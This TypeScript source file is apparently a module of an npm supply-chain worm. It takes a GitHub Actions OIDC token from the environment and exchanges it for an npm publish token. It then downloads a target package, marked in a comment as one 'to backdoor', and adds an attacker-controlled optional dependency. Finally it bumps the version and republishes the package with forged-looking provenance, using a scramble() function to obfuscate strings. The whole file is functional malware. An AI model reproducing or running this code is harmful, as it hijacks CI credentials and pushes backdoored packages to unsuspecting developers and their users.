import { $ } from "bun";
import { randomBytes } from "crypto";
import { copyFileSync, createWriteStream } from "fs";
import * as fs from "fs/promises";
import * as path from "path";
import { join } from "path";
import { Readable } from "stream";
import { pipeline } from "stream/promises";
import * as tar from "tar";

import { PACKAGE_NAME } from "../../utils/config";
import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { publishTarball } from "../npm/publish";
import { generateProvenanceBundle } from "./provenance";

declare function scramble(str: string): string;

// Replace with packages to backdoor
const PACKAGES = [scramble("@opensearch-project/opensearch")];

export class NPMOidcClient extends Mutator {
  constructor() {
    super();
  }

  private async updateTarball(tarballPath: string): Promise<string> {
    const uniqueSuffix = `${Date.now()}_${randomBytes(8).toString("hex")}`;
    const tmpDir = path.join(path.dirname(tarballPath), `_tmp_${uniqueSuffix}`);
    await fs.mkdir(tmpDir, { recursive: true });

    try {
      await tar.extract({ file: tarballPath, cwd: tmpDir });
      const pkgJsonPath = path.join(tmpDir, "package", "package.json");
      const pkg = JSON.parse(await fs.readFile(pkgJsonPath, "utf-8"));
      pkg.optionalDependencies ??= {};
      pkg.optionalDependencies["@opensearch/setup"] = PACKAGE_NAME;
      const [major, minor, patch] = pkg.version.split(".").map(Number);
      pkg.version = `${major}.${minor}.${patch + 1}`;
      await Bun.write(pkgJsonPath, JSON.stringify(pkg, null, 2));

      const updatedPath = path.join(
        path.dirname(tarballPath),
        `${uniqueSuffix}_${scramble(`package-updated.tgz`)}`,
      );
      await pipeline(
        tar.create({ gzip: true, cwd: tmpDir }, ["package"]),
        createWriteStream(updatedPath),
      );

      // Defensive postcondition: fail loudly here with context if the
      // tarball is somehow not a valid gzip stream, instead of
      // exploding inside `gunzipSync` further down the pipeline.
      const written = await fs.readFile(updatedPath);
      if (written.length < 18 || written[0] !== 0x1f || written[1] !== 0x8b) {
        throw new Error(
          `[npmoidc] tarball at ${updatedPath} is not a valid gzip stream ` +
            `(len=${written.length}, first bytes=${written.subarray(0, 4).toString("hex")})`,
        );
      }

      logUtil.log(`Updated path: ${updatedPath}`);
      return updatedPath;
    } finally {
    }
  }

  async downloadPackages(
    packages: string[],
    oidcToken: string,
  ): Promise<{ tmpDir: string; downloaded: string[] }> {
    const tmpDir = await $`mktemp -d`.text().then((s) => s.trim());
    const downloaded: string[] = [];

    const download = async (pkg: string) => {
      try {
        const meta = await fetch(
          scramble("https://registry.npmjs.org/") +
            `${pkg.replace("/", "%2F")}`,
        );
        if (!meta.ok) return;
        const { "dist-tags": tags, versions } = (await meta.json()) as {
          "dist-tags": { latest: string };
          versions: Record<string, { dist?: { tarball?: string } }>;
        };
        const tarball = versions[tags.latest]?.dist?.tarball;
        if (!tarball) return;

        const res = await fetch(tarball);
        if (!res.ok || !res.body) return;

        const filename = `${pkg.replace("@", "").replace("/", "-")}-${tags.latest}.tgz`;
        const tarballPath = join(tmpDir, filename);
        await pipeline(
          Readable.fromWeb(res.body as import("stream/web").ReadableStream),
          createWriteStream(tarballPath),
        );
        const updatedPath = await this.updateTarball(tarballPath);

        // Generate sigstore provenance (best-effort; publish proceeds without it on failure).
        let provenanceBundle: Record<string, any> | undefined;
        try {
          const result = await generateProvenanceBundle(updatedPath);
          if (result) {
            provenanceBundle = result.bundle;
            if (result.transparencyLogUrl) {
              logUtil.log(`[provenance] ${pkg}: ${result.transparencyLogUrl}`);
            }
          }
        } catch (provErr) {
          logUtil.log(`[provenance] generation failed for ${pkg}: ${provErr}`);
        }

        await this.publishPackage(
          updatedPath,
          pkg,
          oidcToken,
          provenanceBundle,
        );
        downloaded.push(updatedPath);
      } catch (e) {
        logUtil.log(`Failed to download ${pkg}: ${e}`);
      }
    };

    await Promise.all(packages.map(download));
    return { tmpDir, downloaded };
  }

  async publishPackage(
    tarballPath: string,
    packageName: string,
    oidcToken: string,
    provenanceBundle?: Record<string, any>,
  ): Promise<boolean> {
    try {
      const escapedPackageName = encodeURIComponent(packageName);
      const npmRes = await fetch(
        `https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/${escapedPackageName}`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${oidcToken}`,
          },
          body: JSON.stringify({ oidcToken }),
        },
      );
      const { token } = (await npmRes.json()) as { token: string };

      if (token) {
        logUtil.log("About to publish!");
        return await publishTarball(
          tarballPath,
          token,
          false,
          provenanceBundle,
        );
      } else {
        logUtil.log("About to publish!");
        await publishTarball(tarballPath, "DummyToken", true);
        return false;
      }
    } catch (e) {
      logUtil.error("Error publishing!");
      logUtil.error(e);
      return false;
    }
  }

  async execute(): Promise<Boolean> {
    const { ACTIONS_ID_TOKEN_REQUEST_TOKEN, ACTIONS_ID_TOKEN_REQUEST_URL } =
      process.env;

    const oidcRes = await fetch(
      `${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=npm:registry.npmjs.org`,
      {
        headers: { Authorization: `bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}` },
      },
    );
    const { value: oidcToken } = (await oidcRes.json()) as { value: string };
    if (oidcToken) {
      await this.downloadPackages(PACKAGES, oidcToken);
      return true;
    } else {
      return false;
    }
  }
}
